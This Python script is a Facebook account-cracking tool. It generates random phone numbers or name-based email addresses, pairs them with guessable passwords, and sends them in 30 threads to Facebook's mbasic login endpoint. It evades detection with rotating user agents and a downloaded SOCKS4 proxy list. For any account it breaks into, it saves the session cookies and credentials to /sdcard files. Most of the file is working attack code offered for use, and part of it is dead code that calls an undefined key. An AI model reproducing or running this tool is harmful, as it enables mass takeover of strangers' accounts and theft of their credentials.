#Create By: EMON HOSSAN BABU 
#: EMON HOSSAN MIAZI 
#---------------------------------------------------------------------------#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
ugen2=[]
ugen=[]
 
ugen=[ ]
for ua in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.0.2','6.0.1','5.1.1','5.0','5.0.1','7.0','10','11','12','13','14','15','16','17','18','19','20'])
    c='SM-J710F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(40,115)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(20,100)
    h='Mobile Safari/537.36'
    ug=(f"{a}  {b} ;  {c} {d}.{f}.{g} {h}")
    ugen.append(ug)

def ____ChRoMeX___():
	__Version__ = f"{random.randint(108,138)}.0.{random.randint(5359,7204)}.{random.randint(42,194)}"
	__Android__ = random.choice(["8.1.0", "9", "10", "12", "7.0", "12", "11", "13", "8.1.0", "13", "7.0", "11", "13", "9", "12", "10", "8.1.0", "7.0"])
	__Model__ = random.choice(["TECNO CA8", "TECNO KC1h", "TECNO CE7", "TECNO CG6j", "TECNO IN5", "TECNO CH6h", "TECNO KF6j", "TECNO CI8", "TECNO IN2", "TECNO LH7n", "TECNO CX Air", "TECNO LE6h", "TECNO KI5q", "TECNO KB3", "TECNO KI5k", "TECNO KE7", "TECNO RB7S", "TECNO W3 Pro"])
	__Build__ = random.choice(["O11019", "OPM2.171019.012", "NMF26X", "SKQ1.210216.001", "R16NW", "SP1A.210812.016", "LMY47X", "QKQ1.200209.002", "MMB29K", "QP1A.190711.020", "LMY47D", "PPR1.180610.011", "NRD90M", "RP1A.201005.001", "MRA58K", "TP1A.220624.014", "MMB29M", "PKQ1.190319.001", "N2G47H", "RKQ1.211103.002", "LMY47V", "RP1A.200720.012", "KTU84P", "PPR1.281373.396", "LMY47I", "RP1A.200720.011"])
	__XoX__ = f"Mozilla/5.0 (Linux; Android {__Android__}; {__Model__} Build/{__Build__}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{__Version__} Mobile Safari/537.36"
	return __XoX__

logo = ("""
\033[33;1m ╦ ╦\033[31;1m╔═╗\033[34;1m╔╦╗\033[35;1m╦\033[32;1m╔╦╗  \x1b[1;96m╔═╗\x1b[38;5;208m╔═╗\033[31;1m╔═╗\033[1;97m╔╗╔\033[1;30m╔╗╔   \033[33;1m╦ ╦\033[35;1m╦╔═╗\033[32;1m╔═╗\033[31;1m╔╗╔
\033[33;1m ╠═╣\033[31;1m╠═╣\033[34;1m║║║\033[35;1m║\033[32;1m║║║  \x1b[1;96m╠═╣\x1b[38;5;208m╠╣ \033[31;1m╠═╣\033[1;97m║║║\033[1;30m║║║   \033[33;1m╠═╣\033[35;1m║╠═╝\033[32;1m╠═╣\033[31;1m║║║
\033[33;1m ╩ ╩\033[31;1m╩ ╩\033[34;1m╩ ╩\033[35;1m╩\033[32;1m╩ ╩  \x1b[1;96m╩ ╩\x1b[38;5;208m╚  \033[31;1m╩ ╩\033[1;97m╝╚╝\033[1;30m╝╚╝   \033[33;1m╩ ╩\033[35;1m╩╩  \033[32;1m╩ ╩\033[31;1m╝╚╝

\x1b[1;95m  ███████╗███╗  ██╗ ██████╗ ███╗  ██╗    ██╗  ██╗ ██████╗ ███████╗ ███╗  ██╗
\x1b[1;94m  ██╔════╝████╗ ██║██╔════╝ ████╗ ██║    ██║  ██║██╔═══██╗██╔════╝ ████╗ ██║
\x1b[1;93m  █████╗  ██╔██╗██║██║  ██╗ ██╔██╗██║    ███████║██║   ██║█████╗   ██╔██╗██║
\x1b[1;92m  ██╔══╝  ██║╚████║██║  ╚██╗██║╚████║    ██╔══██║██║   ██║██╔══╝   ██║╚████║
\x1b[1;91m  ███████╗██║ ╚███║╚██████╔╝██║ ╚███║    ██║  ██║╚██████╔╝███████╗ ██║ ╚███║
\x1b[1;97m  ╚══════╝╚═╝  ╚══╝ ╚═════╝ ╚═╝  ╚══╝    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═╝  ╚══╝
\033[38;5;46m┌━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┐\033[33;1m \033[38;5;46m
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘈𝘜𝘛𝘏𝘖𝘙      \033[1;97m  :  \033[34;1mEMON HOSSAN MIAZI    \033[38;5;46 
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;97m:  \033[34;1memomhossan21        \033[38;5;46m │  \033[33;1
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗   \033[1;97m   :  \033[34;1m01875828427       \033[38;5;46m│
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘗𝘖𝘞𝘌𝘙       \033[1;97m  :  \033[34m𝙀𝙢𝙤𝙣 𝙃𝙤𝙨𝙨𝙖𝙣 𝙈𝙞𝙖𝙯𝙞         \033[38;5;46m│
\033[38;5;46m└━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┘""")




import os
try:
    import requests
except ImportError:
    print('\n [âœ“] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [âœ“] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [âœ“] installing bs4 !...\n')
    os.system('pip install bs4')




    print("""
\033[33;1m ╦ ╦\033[31;1m╔═╗\033[34;1m╔╦╗\033[35;1m╦\033[32;1m╔╦╗ \x1b[1;96m╦ ╦\x1b[38;5;208m╔╦╗\033[31;1m╔╦╗\033[1;97m╦\033[1;30m╔╗╔\33[33;1m  ╦\33[35;1m╦\33[32;1m╔═╗\33[31;1m╔═╗\33[34;1m╔╗╔
\033[33;1m ╠═╣\033[31;1m╠═╣\033[34;1m║║║\033[35;1m║\033[32;1m║║║ \x1b[1;96m║ ║ \x1b[38;5;208m║║ \033[31;1m║║\033[1;97m║\033[1;30m║║║ \33[33;1m ║\33[35;1m║\33[32;1m╚═╗\33[31;1m╠═╣\33[34;1m║║║
\033[33;1m ╩ ╩\033[31;1m╩ ╩\033[34;1m╩ ╩\033[35;1m╩\033[32;1m╩ ╩ \x1b[1;96m╚═╝\x1b[38;5;208m═╩╝\033[31;1m═╩╝\033[1;97m╩\033[1;30m╝╚╝ \33[33;1m╚╝\33[35;1m╩\33[32;1m╚═╝\33[31;1m╩ ╩\33[34;1m╝╚╝
\033[38;5;46m┌━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┐\033[33;1m \033[38;5;46m
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘈𝘜𝘛𝘏𝘖𝘙      \033[1;97m  :  \033[34;1mEMON HOSSAN MIAZI    \033[38;5;46 
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;97m:  \033[34;1memomhossan21        \033[38;5;46m │  \033[33;1
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗   \033[1;97m   :  \033[34;1m01875828427       \033[38;5;46m│
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘗𝘖𝘞𝘌𝘙       \033[1;97m  :  \033[34;1mEMON HOSSAN         \033[38;5;46m│
\033[38;5;46m└━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┘""")
    print("Your key  : "+key2)
    print("\n\t\tContact Admin ")
    os.system('xdg-open https://wa.me/+8801875828427')
    exit()
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(" [01] Random Number Clone")
        print(" [02] Random Email Clone ")
        print(" [00] Exit")
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Mumit =input(" [?] Choose : ")
        os.system('xdg-open https://www.facebook.com/120Xuspa')
        if Mumit in ["1", "01"]:
            num()
        if Mumit in ["2","02"]:
            gml()
        if Mumit in [" 0", "00"]:
            exit()
        else:
            exit()
def num():
    user=[]
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
    print("\x1b[1;96m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    kode = input(' [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\x1b[1;96m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input(' [?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
        print(' \033[1;97m[+] Process has been started')
        print(' \033[1;97m[!] Wait for ids ')
        print(' \033[1;97m[!] Use flight mode for speed up ')
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in EMON-OK.txt,EMON-CP.txt')

def gml():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [?] Target fast name : ')
    os.system('clear')
    print(logo)
    kodex = input(' [?] Target last name :  ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    doamin = input(' [?] Terget doamin : ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\x1b[1;96m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input('[?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;97m[+] Total ids:\x1b[1;96m '+tl)
        print(' \033[1;97m[+] Process has been started')
        print(' \033[1;97m[!] Wait for ids ')
        print(' \033[1;97m[!] Use flight mode for speed up ')
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session=requests.session()
            link=session.get("https://mbasic.facebook.com/").text
            rr=random.randint
            data={
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': 'p',
            '__hs': '20156.BP:wbloks_caa_pkg.2.0...0',
            'dpr': '1',
            '__ccg': 'MODERATE',
            '__rev': '1020727961',
            '__s': ':i9p1qu:mahlv2',
            '__hsi': '7479797114083238570',
            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
            '__csr': '',
            '__hsdp': '',
            '__hblp': '',
            'fb_dtsg': 'NAcNUIYwJi18an1KNSKvDEsLdLTDlQVpg1Vud66BoblVCSXRf0aNVow:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1), 
            'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1), 
            'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"nlnwft:68\\",\\"password_text_input_id\\":\\"nlnwft:69\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"142710911300379\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"contact_point\\":\\"'+uid+'\\",\\"password\\":\\"#PWD_BROWSER:0:'+str(time.time()).split('.')[0]+':'+ps+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
            headers = {
            'authority': 'mbasic.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'mbasic.facebook.com',
            'referer': 'https://mbasic.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"23090RA98G"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ____ChRoMeX___(),}
            session.post('https://mbasic.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=2c4733784ae1256fe36c8fac264a2939b8558cfc1bad5ac672c9bc60482cab5a',headers=headers, data=data).text
            ____ReQ____=session.cookies.get_dict().keys()
            if 'c_user' in ____ReQ____:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[EMON-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                open('/sdcard/EMON-OK.txt', 'a').write( uid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in ____ReQ____:
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[EMON-CP] {cid} | {ps}")
                open('/sdcard/EMON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[EMON] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()